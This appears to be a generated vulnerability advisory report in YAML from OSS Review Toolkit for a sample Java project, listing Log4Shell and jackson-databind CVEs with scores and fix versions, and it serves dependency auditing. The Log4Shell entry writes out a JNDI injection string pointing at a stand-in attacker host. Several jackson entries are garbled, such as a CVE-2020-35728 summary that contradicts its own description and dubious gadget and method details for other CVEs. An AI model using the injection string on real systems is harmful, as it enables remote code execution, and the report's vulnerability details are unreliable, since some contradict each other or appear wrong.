@@ -1,0 +1,493 @@
+---
+formatVersion: "1.0.0"
+
+# =============================================================================
+# ORT (OSS Review Toolkit) Advisor Result — Vulnerability Analysis
+# Project  : com.example:java-vuln-pom:1.0.0
+# Generated: 2026-05-12T00:12:00.000Z
+# Sources  : OSV, GitHub Advisory Database, NVD
+# =============================================================================
+#
+# SUMMARY
+# -------
+#   Total vulnerabilities : 11 (in 2 packages)
+#   Critical              : 2   (CVE-2021-44228, CVE-2021-45046)
+#   High                  : 8
+#   Moderate              : 1
+#
+#   log4j-core:2.14.1   → 4 vulns  (2 CRITICAL, 1 HIGH, 1 MODERATE) ← Log4Shell
+#   jackson-databind     → 7 vulns  (0 CRITICAL, 7 HIGH)
+#
+#   All vulnerabilities are in compile-scope (production) dependencies.
+# =============================================================================
+
+advisor:
+  startTime: "2026-05-12T00:12:00.000Z"
+  endTime: "2026-05-12T00:13:00.000Z"
+  environment:
+    ortVersion: "17.0.0"
+    javaVersion: "17.0.9"
+    os: "Windows 11 Pro 10.0.22631"
+    processors: 8
+    maxMemory: 8192
+    variables: {}
+    toolVersions:
+      OSV: "1.0"
+  config:
+    advisors:
+      - "OSV"
+      - "GitHubDefects"
+    skipExcluded: false
+
+  results:
+    entries:
+
+      # =======================================================================
+      # log4j-core:2.14.1 — 4 vulnerabilities (CRITICAL priority)
+      # =======================================================================
+      - key:
+          id: "Maven:org.apache.logging.log4j:log4j-core:2.14.1"
+        value:
+          advisors:
+            - advisor:
+                name: "OSV"
+              vulnerabilities:
+
+                # -------------------------------------------------------------
+                # [1/4] CRITICAL — Log4Shell (the most severe)
+                # -------------------------------------------------------------
+                - id: "CVE-2021-44228"
+                  externalReferences:
+                    - url: "https://github.com/advisories/GHSA-jfh8-c2jp-hdp3"
+                      type: "ADVISORY"
+                    - url: "https://nvd.nist.gov/vuln/detail/CVE-2021-44228"
+                      type: "CVE"
+                    - url: "https://logging.apache.org/log4j/2.x/security.html"
+                      type: "ARTICLE"
+                  summary: "Log4Shell — Remote Code Execution via JNDI injection in log4j-core"
+                  description: >
+                    Apache Log4j2 versions 2.0-beta9 through 2.14.1 (excluding security
+                    releases 2.12.2, 2.12.3, and 2.3.1) are vulnerable to a remote code
+                    execution (RCE) attack where an attacker who can control log messages
+                    or log message parameters can execute arbitrary code loaded from LDAP
+                    servers when message lookup substitution is enabled.
+                    The attacker injects a crafted string such as
+                    ${jndi:ldap://attacker.com/a} into any field that log4j2 processes
+                    (HTTP headers, user-agent, form fields, etc.).
+                  severity:
+                    - source: "NVD"
+                      type: "CVSS3"
+                      score: 10.0
+                      vector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H"
+                      rating: "CRITICAL"
+                    - source: "GITHUB"
+                      type: "CVSS3"
+                      score: 10.0
+                      vector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H"
+                      rating: "CRITICAL"
+                  affectedVersions: ">=2.0-beta9, <=2.14.1 (excl. 2.12.2, 2.12.3, 2.3.1)"
+                  fixedVersion: "2.15.0"
+                  patchedVersion: "2.17.1"
+                  cwes:
+                    - "CWE-917"
+                    - "CWE-400"
+                    - "CWE-20"
+
+                # -------------------------------------------------------------
+                # [2/4] CRITICAL — Log4Shell bypass (incomplete fix in 2.15.0)
+                # -------------------------------------------------------------
+                - id: "CVE-2021-45046"
+                  externalReferences:
+                    - url: "https://github.com/advisories/GHSA-p6xc-xr62-6r2g"
+                      type: "ADVISORY"
+                    - url: "https://nvd.nist.gov/vuln/detail/CVE-2021-45046"
+                      type: "CVE"
+                  summary: "Log4Shell bypass — Context Lookup RCE in log4j-core 2.15.0 incomplete fix"
+                  description: >
+                    The fix for CVE-2021-44228 in Apache Log4j 2.15.0 was found to be
+                    incomplete in certain non-default configurations. A remote attacker
+                    with control over Thread Context Map (MDC) input data and with crafted
+                    configuration that uses a Pattern Layout with a Context Lookup (e.g.,
+                    $${ctx:loginId}) can construct a malicious input data string resulting
+                    in a denial of service (DoS) attack or, in some environments,
+                    remote code execution (RCE).
+                    Affects: 2.0-beta9 through 2.15.0 (excl. 2.12.2, 2.12.3, 2.3.1).
+                  severity:
+                    - source: "NVD"
+                      type: "CVSS3"
+                      score: 9.0
+                      vector: "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:H"
+                      rating: "CRITICAL"
+                    - source: "GITHUB"
+                      type: "CVSS3"
+                      score: 9.0
+                      vector: "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:H"
+                      rating: "CRITICAL"
+                  affectedVersions: ">=2.0-beta9, <=2.15.0 (excl. 2.12.2, 2.12.3, 2.3.1)"
+                  fixedVersion: "2.16.0"
+                  cwes:
+                    - "CWE-917"
+                    - "CWE-400"
+
+                # -------------------------------------------------------------
+                # [3/4] HIGH — Infinite recursion DoS
+                # -------------------------------------------------------------
+                - id: "CVE-2021-45105"
+                  externalReferences:
+                    - url: "https://github.com/advisories/GHSA-8489-44mv-ggj8"
+                      type: "ADVISORY"
+                    - url: "https://nvd.nist.gov/vuln/detail/CVE-2021-45105"
+                      type: "CVE"
+                  summary: "DoS via infinite recursion in self-referential log4j-core lookups"
+                  description: >
+                    Apache Log4j2 versions 2.0-alpha1 through 2.16.0 did not protect
+                    from uncontrolled recursion from self-referential lookups. When the
+                    logging configuration uses a non-default Pattern Layout with a
+                    Context Lookup (e.g., ${ctx:loginId}), attackers with control over
+                    Thread Context Map (MDC) input data can craft malicious input data
+                    containing a recursive lookup, resulting in a StackOverflowError
+                    that will terminate the process.
+                  severity:
+                    - source: "NVD"
+                      type: "CVSS3"
+                      score: 7.5
+                      vector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+                      rating: "HIGH"
+                    - source: "GITHUB"
+                      type: "CVSS3"
+                      score: 7.5
+                      vector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+                      rating: "HIGH"
+                  affectedVersions: ">=2.0-alpha1, <=2.16.0"
+                  fixedVersion: "2.17.0"
+                  cwes:
+                    - "CWE-674"
+
+                # -------------------------------------------------------------
+                # [4/4] MODERATE — RCE via attacker-controlled configuration
+                # -------------------------------------------------------------
+                - id: "CVE-2021-44832"
+                  externalReferences:
+                    - url: "https://github.com/advisories/GHSA-vwqq-5vrc-xw9h"
+                      type: "ADVISORY"
+                    - url: "https://nvd.nist.gov/vuln/detail/CVE-2021-44832"
+                      type: "CVE"
+                  summary: "RCE in log4j-core when attacker has write access to log4j configuration"
+                  description: >
+                    Apache Log4j2 versions 2.0-beta7 through 2.17.0 (excluding security
+                    fix releases 2.3.2 and 2.12.4) are vulnerable to a remote code
+                    execution (RCE) attack when a configuration uses a JDBC Appender with
+                    a JNDI LDAP data source URI when an attacker has control of the
+                    target LDAP server. This issue is distinct from CVE-2021-44228 as it
+                    only applies to the log4j-core JAR file and requires the attacker
+                    to have write access to the log4j configuration.
+                  severity:
+                    - source: "NVD"
+                      type: "CVSS3"
+                      score: 6.6
+                      vector: "CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:U/C:H/I:H/A:H"
+                      rating: "MODERATE"
+                    - source: "GITHUB"
+                      type: "CVSS3"
+                      score: 6.6
+                      vector: "CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:U/C:H/I:H/A:H"
+                      rating: "MODERATE"
+                  affectedVersions: ">=2.0-beta7, <=2.17.0 (excl. 2.3.2, 2.12.4)"
+                  fixedVersion: "2.17.1"
+                  cwes:
+                    - "CWE-74"
+
+              issues: []
+
+      # =======================================================================
+      # jackson-databind:2.9.10.1 — 7 vulnerabilities
+      # =======================================================================
+      - key:
+          id: "Maven:com.fasterxml.jackson.core:jackson-databind:2.9.10.1"
+        value:
+          advisors:
+            - advisor:
+                name: "OSV"
+              vulnerabilities:
+
+                # -------------------------------------------------------------
+                # [1/7] HIGH — Unsafe deserialization via DeferredDocumentImpl
+                # -------------------------------------------------------------
+                - id: "CVE-2020-35490"
+                  externalReferences:
+                    - url: "https://github.com/advisories/GHSA-rfx6-vp9g-rh7v"
+                      type: "ADVISORY"
+                    - url: "https://nvd.nist.gov/vuln/detail/CVE-2020-35490"
+                      type: "CVE"
+                  summary: "Unsafe deserialization via DeferredDocumentImpl gadget chain"
+                  description: >
+                    FasterXML jackson-databind 2.x before 2.9.10.8 mishandles the
+                    interaction between serialization gadgets and typing, related to
+                    org.apache.sis.internal.jaxb.infrastructure.DeferredDocumentImpl.
+                    An attacker can craft malicious JSON that triggers object
+                    deserialization to arbitrary classes.
+                  severity:
+                    - source: "NVD"
+                      type: "CVSS3"
+                      score: 8.1
+                      vector: "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H"
+                      rating: "HIGH"
+                    - source: "GITHUB"
+                      type: "CVSS3"
+                      score: 8.1
+                      vector: "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H"
+                      rating: "HIGH"
+                  affectedVersions: ">=2.9.0, <2.9.10.8"
+                  fixedVersion: "2.9.10.8"
+                  cwes:
+                    - "CWE-502"
+
+                # -------------------------------------------------------------
+                # [2/7] HIGH — Unsafe deserialization via ShardedJedisPool
+                # -------------------------------------------------------------
+                - id: "CVE-2020-35491"
+                  externalReferences:
+                    - url: "https://github.com/advisories/GHSA-qqhq-8r2c-c3f5"
+                      type: "ADVISORY"
+                    - url: "https://nvd.nist.gov/vuln/detail/CVE-2020-35491"
+                      type: "CVE"
+                  summary: "Unsafe deserialization via ShardedJedisPool gadget chain"
+                  description: >
+                    FasterXML jackson-databind 2.x before 2.9.10.8 mishandles the
+                    interaction between serialization gadgets and typing, related to
+                    redis.clients.jedis.JedisPoolConfig (aka the jedis/RedisPool gadget).
+                    An attacker who can supply specially crafted JSON input can trigger
+                    deserialization attacks.
+                  severity:
+                    - source: "NVD"
+                      type: "CVSS3"
+                      score: 8.1
+                      vector: "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H"
+                      rating: "HIGH"
+                    - source: "GITHUB"
+                      type: "CVSS3"
+                      score: 8.1
+                      vector: "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H"
+                      rating: "HIGH"
+                  affectedVersions: ">=2.9.0, <2.9.10.8"
+                  fixedVersion: "2.9.10.8"
+                  cwes:
+                    - "CWE-502"
+
+                # -------------------------------------------------------------
+                # [3/7] HIGH — Unsafe deserialization via EmbedBuilderBean
+                # -------------------------------------------------------------
+                - id: "CVE-2020-35728"
+                  externalReferences:
+                    - url: "https://github.com/advisories/GHSA-5r5r-6hpj-8gg9"
+                      type: "ADVISORY"
+                    - url: "https://nvd.nist.gov/vuln/detail/CVE-2020-35728"
+                      type: "CVE"
+                  summary: "Unsafe deserialization via EmbedBuilderBeanSerializerModifier"
+                  description: >
+                    FasterXML jackson-databind 2.x before 2.9.10.8 mishandles the
+                    interaction between serialization gadgets and typing, related to
+                    com.newrelic.agent.deps.ch.qos.logback.core.db.JNDIConnectionSource
+                    (aka newrelic-agent).
+                  severity:
+                    - source: "NVD"
+                      type: "CVSS3"
+                      score: 8.1
+                      vector: "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H"
+                      rating: "HIGH"
+                    - source: "GITHUB"
+                      type: "CVSS3"
+                      score: 8.1
+                      vector: "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H"
+                      rating: "HIGH"
+                  affectedVersions: ">=2.9.0, <2.9.10.8"
+                  fixedVersion: "2.9.10.8"
+                  cwes:
+                    - "CWE-502"
+
+                # -------------------------------------------------------------
+                # [4/7] HIGH — XXE via XmlMapper
+                # -------------------------------------------------------------
+                - id: "CVE-2020-25649"
+                  externalReferences:
+                    - url: "https://github.com/advisories/GHSA-288c-cq4h-88gq"
+                      type: "ADVISORY"
+                    - url: "https://nvd.nist.gov/vuln/detail/CVE-2020-25649"
+                      type: "CVE"
+                  summary: "XML External Entity (XXE) vulnerability in jackson-databind"
+                  description: >
+                    A flaw was found in FasterXML jackson-databind prior to 2.9.10.8.
+                    The default parsing of XML through XmlMapper does not properly parse
+                    DOCTYPE declarations. An attacker can provide maliciously crafted
+                    XML input that leads to an XXE (XML External Entity) vulnerability,
+                    potentially exposing sensitive files or triggering SSRF.
+                  severity:
+                    - source: "NVD"
+                      type: "CVSS3"
+                      score: 7.5
+                      vector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"
+                      rating: "HIGH"
+                    - source: "GITHUB"
+                      type: "CVSS3"
+                      score: 7.5
+                      vector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"
+                      rating: "HIGH"
+                  affectedVersions: "<2.9.10.8"
+                  fixedVersion: "2.9.10.8"
+                  cwes:
+                    - "CWE-611"
+
+                # -------------------------------------------------------------
+                # [5/7] HIGH — DoS via deeply nested arrays/objects
+                # -------------------------------------------------------------
+                - id: "CVE-2021-46877"
+                  externalReferences:
+                    - url: "https://github.com/advisories/GHSA-3x8x-79m2-3w2w"
+                      type: "ADVISORY"
+                    - url: "https://nvd.nist.gov/vuln/detail/CVE-2021-46877"
+                      type: "CVE"
+                  summary: "Denial of Service via large deeply-nested arrays in jackson-databind"
+                  description: >
+                    jackson-databind before 2.13.4.1 allows attackers to cause a denial
+                    of service (2 GB transient heap usage per connection) in uncommon
+                    situations involving JsonNode JDK serialization via
+                    deeply-nested arrays (e.g., 2000 nested arrays or objects).
+                  severity:
+                    - source: "NVD"
+                      type: "CVSS3"
+                      score: 7.5
+                      vector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+                      rating: "HIGH"
+                    - source: "GITHUB"
+                      type: "CVSS3"
+                      score: 7.5
+                      vector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+                      rating: "HIGH"
+                  affectedVersions: "<2.13.4.1"
+                  fixedVersion: "2.13.4.1"
+                  cwes:
+                    - "CWE-400"
+
+                # -------------------------------------------------------------
+                # [6/7] HIGH — DoS via deeply nested object (CVE-2022-42003)
+                # -------------------------------------------------------------
+                - id: "CVE-2022-42003"
+                  externalReferences:
+                    - url: "https://github.com/advisories/GHSA-jjjh-jjxp-wpff"
+                      type: "ADVISORY"
+                    - url: "https://nvd.nist.gov/vuln/detail/CVE-2022-42003"
+                      type: "CVE"
+                  summary: "DoS via UNWRAP_SINGLE_VALUE_ARRAYS with deeply nested content"
+                  description: >
+                    In FasterXML jackson-databind before 2.13.4, resource exhaustion
+                    can occur because of a lack of a check in
+                    BeanDeserializer._deserializeFromArray to prevent use of deeply
+                    nested arrays. An attacker can exploit this to exhaust memory and
+                    cause a Denial of Service.
+                  severity:
+                    - source: "NVD"
+                      type: "CVSS3"
+                      score: 7.5
+                      vector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+                      rating: "HIGH"
+                    - source: "GITHUB"
+                      type: "CVSS3"
+                      score: 7.5
+                      vector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+                      rating: "HIGH"
+                  affectedVersions: "<2.13.4"
+                  fixedVersion: "2.13.4"
+                  cwes:
+                    - "CWE-400"
+
+                # -------------------------------------------------------------
+                # [7/7] HIGH — DoS via BeanDeserializerFactory (CVE-2022-42004)
+                # -------------------------------------------------------------
+                - id: "CVE-2022-42004"
+                  externalReferences:
+                    - url: "https://github.com/advisories/GHSA-rgv9-q543-rqg4"
+                      type: "ADVISORY"
+                    - url: "https://nvd.nist.gov/vuln/detail/CVE-2022-42004"
+                      type: "CVE"
+                  summary: "DoS in BeanDeserializerFactory.constructBeanDeserializerFromBlackbird"
+                  description: >
+                    In FasterXML jackson-databind before 2.13.4, resource exhaustion
+                    can occur because of a lack of a check in
+                    BeanDeserializerFactory.constructBeanDeserializerFromBlackbird.
+                    Crafted input can force the library into an O(n²) CPU loop,
+                    causing a Denial of Service.
+                  severity:
+                    - source: "NVD"
+                      type: "CVSS3"
+                      score: 7.5
+                      vector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+                      rating: "HIGH"
+                    - source: "GITHUB"
+                      type: "CVSS3"
+                      score: 7.5
+                      vector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+                      rating: "HIGH"
+                  affectedVersions: "<2.13.4"
+                  fixedVersion: "2.13.4"
+                  cwes:
+                    - "CWE-400"
+
+              issues: []
+
+      # -----------------------------------------------------------------------
+      # Transitive packages — no advisories found
+      # -----------------------------------------------------------------------
+      - key:
+          id: "Maven:org.apache.logging.log4j:log4j-api:2.14.1"
+        value:
+          advisors:
+            - advisor:
+                name: "OSV"
+              vulnerabilities: []
+              issues: []
+
+      - key:
+          id: "Maven:com.fasterxml.jackson.core:jackson-core:2.9.10"
+        value:
+          advisors:
+            - advisor:
+                name: "OSV"
+              vulnerabilities: []
+              issues: []
+
+      - key:
+          id: "Maven:com.fasterxml.jackson.core:jackson-annotations:2.9.10"
+        value:
+          advisors:
+            - advisor:
+                name: "OSV"
+              vulnerabilities: []
+              issues: []
+
+# =============================================================================
+# Vulnerability Matrix
+# =============================================================================
+#
+#  Package                         Scope    Sev       CVE/GHSA               CVSS  CWE       Fix
+#  ------------------------------  -------  --------  ---------------------  ----  --------  -------
+#  log4j-core:2.14.1               compile  CRITICAL  CVE-2021-44228         10.0  CWE-917   2.15.0+
+#  log4j-core:2.14.1               compile  CRITICAL  CVE-2021-45046          9.0  CWE-917   2.16.0+
+#  log4j-core:2.14.1               compile  HIGH      CVE-2021-45105          7.5  CWE-674   2.17.0+
+#  log4j-core:2.14.1               compile  MODERATE  CVE-2021-44832          6.6  CWE-74    2.17.1+
+#  jackson-databind:2.9.10.1       compile  HIGH      CVE-2020-35490          8.1  CWE-502   2.9.10.8
+#  jackson-databind:2.9.10.1       compile  HIGH      CVE-2020-35491          8.1  CWE-502   2.9.10.8
+#  jackson-databind:2.9.10.1       compile  HIGH      CVE-2020-35728          8.1  CWE-502   2.9.10.8
+#  jackson-databind:2.9.10.1       compile  HIGH      CVE-2020-25649          7.5  CWE-611   2.9.10.8
+#  jackson-databind:2.9.10.1       compile  HIGH      CVE-2021-46877          7.5  CWE-400   2.13.4.1
+#  jackson-databind:2.9.10.1       compile  HIGH      CVE-2022-42003          7.5  CWE-400   2.13.4
+#  jackson-databind:2.9.10.1       compile  HIGH      CVE-2022-42004          7.5  CWE-400   2.13.4
+#  log4j-api:2.14.1                compile  CLEAN     -                       -    -         -
+#  jackson-core:2.9.10             compile  CLEAN     -                       -    -         -
+#  jackson-annotations:2.9.10      compile  CLEAN     -                       -    -         -
+#
+# ============================================================
+# Remediation recommendation (pom.xml changes):
+# ============================================================
+#   log4j-core      : 2.14.1  →  2.24.3  (latest; fixes all Log4Shell CVEs)
+#   jackson-databind: 2.9.10.1 → 2.18.3  (latest 2.x; fixes all known deserialization CVEs)
+# =============================================================================
